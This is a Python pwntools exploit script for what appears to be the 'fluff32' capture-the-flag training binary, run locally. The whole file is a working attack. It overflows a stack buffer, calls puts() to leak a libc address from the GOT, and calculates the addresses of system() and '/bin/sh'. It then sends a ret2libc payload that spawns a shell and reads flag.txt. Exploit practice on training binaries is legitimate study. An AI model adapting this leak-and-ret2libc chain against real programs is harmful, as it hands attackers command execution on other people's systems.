from pwn import *

#run this command to have the binary listen on localhost:1234
#socat TCP4-LISTEN:1234,reuseaddr,fork EXEC:./fluff32

LOCATION = "./fluff32"
LIBC_LOC = "/lib32/libc.so.6"        #used libc found with ldd ./binary
REMOTE   = remote("localhost", 1234) #binary listening on the machine

binary = ELF(LOCATION)
libc   = ELF(LIBC_LOC)

putsFunc = binary.symbols["puts"]  #extract address of puts() from the binary
mainFunc = binary.symbols["main"]  #extract address of main() from the binary
putsGot  = binary.got["puts"]      #extract address of puts() in the GOT

def pcOffset(): 
    proc = process(LOCATION, timeout=2)
    proc.sendline(cyclic(1024))
    proc.recvall()  
    core = Core("core")
    pcOff = cyclic_find(core.pc)
    return pcOff

def leakAddr(address, offset):
    payload  = 'A' * offset     #overflow buffer
    payload += p32(putsFunc)    #call puts function
    payload += p32(mainFunc)    #return to main so that binary doesn't die
    payload += p32(address)     #argument to puts i.e. address to leak :D
    REMOTE.recvuntil('>')
    REMOTE.sendline(payload)
    REMOTE.recv()
    return u32(REMOTE.recv(4))  #leak dat address pls :3

def exploit(systemFunc, command, offset):
    payload  = 'A' * offset  #overflow buffer
    payload += p32(system)   #system address
    payload += "LMAO"        #return address of system, can be fixed
    payload += p32(command)  #command to be executed (most of the times /bin/sh)
    REMOTE.recvuntil('>')
    REMOTE.sendline(payload)
    log.success("Exploit run successfully, flag is arriving...")
    #REMOTE.interactive() #you can uncomment this in order to get a shell instead of just the flag
    REMOTE.sendline("cat flag.txt && exit")
    log.success("Flag:{0}".format(REMOTE.recvall()))

def getSystem(offset):
    putsLeak = leakAddr(putsGot, offset) #leak remote address of puts()
    log.info("Leaked puts() at {0}".format(hex(putsLeak)))

    putsLibc = libc.symbols["puts"]     #extract puts() offset from libc
    libcBaseAddr = putsLeak - putsLibc  #find libc base address by subtracting puts() offset from puts() address
    log.info("Base address of libc at {0}".format(hex(libcBaseAddr)))

    systemFunc = libc.symbols["system"] + libcBaseAddr #find system() address by adding its offset to libc base address
    log.info("Remote address of system() should be {0}".format(hex(systemFunc)))
    
    binshAddr = next(libc.search("/bin/sh\x00")) + libcBaseAddr #find "/bin/sh" string in libc
    log.info("Address of \"/bin/sh\" string is {0}".format(hex(binshAddr)))

    return systemFunc,binshAddr


offset = pcOffset()
log.info("EIP offset at {0}".format(offset))

system,binsh = getSystem(offset) #call getSystem() to get the address of "/bin/sh" and systemm()
exploit(system, binsh, offset)



